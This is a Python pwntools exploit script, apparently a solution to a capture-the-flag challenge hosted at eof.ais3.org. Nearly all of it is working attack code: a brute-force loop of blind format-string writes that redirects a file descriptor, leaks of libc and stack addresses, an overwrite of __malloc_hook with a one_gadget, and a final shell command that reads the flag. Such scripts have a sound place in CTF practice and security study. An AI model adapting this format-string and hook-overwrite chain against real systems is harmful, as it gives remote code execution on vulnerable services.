#!/usr/bin/python3
from pwn import *
import random

one_gadget = 0xe569f
maxTime = 1.5 - 0.2
count = 0

def send(payload, sleeptime=0.01):
    global count
    log.info('send payload: {}'.format(payload))
    p.sendline(payload)
    sleep(sleeptime)
    count += 1

def fmtatk(content, idx, size=1):
    global count
    if size == 1:
        n = b'$hhn'
    elif size == 2:
        n = b'$hn'
    else:
        n = b'$n'

    if content == 0:
        payload = b'%' + str(idx).encode() + n
    else:
        payload = b'%' + str(content).encode() + b'c'
        payload += b'%' + str(idx).encode() + n
    send(payload+b'\0')
    
    sleep(maxTime * content / 255 + 0.2)
    count += 1

def updatePath(rspoffset, path, size=4):
    offset = (rsp + rspoffset) & 0xff
    mask = 0xff
    shift = 0
    
    for i in range(size):
        fmtatk(offset + i, 5)
        fmtatk((path & mask) >> shift, 7)
        
        mask <<= 8
        shift += 8

libc = ELF('./libc-2.27.so')    

bingo = False
i = 0
while i < 1024:
    i += 1
    log.info('{} times connection'.format(i))
    stack = random.randrange(0x10, 0xf0, 0x10)
    ptrfd = random.randrange(0x10, 0xf0, 0x10)
    
    try:
        p = remote('eof.ais3.org', 1337)
        # p = remote('localhost', 5566) # ncat -kvl 5566 -c ./blackhole
    
        send('%{}c%5$hhn'.format(stack+8).encode(), maxTime * (stack+8) / 255 + 0.2) # guess stack LSB: 0x?8
        send(b'%16c%7$hhn\0', maxTime * 16 / 255 + 0.2) # rewrite ptr to fd: 0x?010
        send('%{}c%5$hhn'.format(stack+8+1).encode(), maxTime * (stack+8+1) / 255 + 0.2)
        send('%{}c%7$hhn\0'.format(ptrfd).encode(), maxTime * ptrfd / 255 + 0.2)
        send(b'c%8$hhn\0')    # rewrite fd: 1
        send(b'aaaa\0')       # get some output if fd becomes 1 from 2
            
        msg = p.recv(timeout=0.2)
        log.info('recv: {}'.format(msg))
        if msg == b'':  
            p.close()
        else:
            log.info('Bingo !')
            bingo = True
            i = 100000000
    except KeyboardInterrupt:
        break
    except:
        log.info('catch except')
        p.close()

if bingo:
    # leak libc base
    send(b'%2$p\n\0')
    libc.address = int(p.recvline(keepends=False), 16) - 0x110081
    one_gadget += libc.address
    log.info('libc: {:#x}'.format(libc.address))
    log.info('one gadget: {:#x}'.format(one_gadget))
    log.info('__malloc_hook: {:#x}'.format(libc.symbols['__malloc_hook']))
    
    # leak stack
    send(b'%5$p\n\0')
    rsp = int(p.recvline(keepends=False), 16) - 0x10
    log.info('rsp: {:#x}'.format(rsp))
    
    # rewrite __malloc_hook to one-gadget
    updatePath(0x18, libc.symbols['__malloc_hook'], size=8)   # 8
    updatePath(0x20, libc.symbols['__malloc_hook']+2, size=8) # 9
    updatePath(0x28, libc.symbols['__malloc_hook']+4, size=8) # 10
    updatePath(0x30, libc.symbols['__malloc_hook']+6, size=8) # 11
    
    parts = {}
    mask = 0xffff
    shift = 0
    for i in range(4):
        parts[8+i] = (one_gadget & mask) >> shift
        mask <<= 16
        shift += 16
    
    parts = {k: v for k, v in sorted(parts.items(), key=lambda item: item[1])}
    
    prev = 0
    payload = b''
    for item in parts.items():
        if item[1] - prev == 0:
            payload += b'%' + str(item[0]).encode() + b'$hn'
        else:
            payload += b'%' + str(item[1] - prev).encode() + b'c'
            payload += b'%' + str(item[0]).encode() + b'$hn'
            prev = item[1]
    send(payload+b'\0')
    
    log.info('payload count: {}'.format(count))
    
    # Invoke __malloc_hook
    p.sendline('LJP')
    
    # Pwned
    p.sendline('cat /home/`whoami`/flag')
    p.interactive()
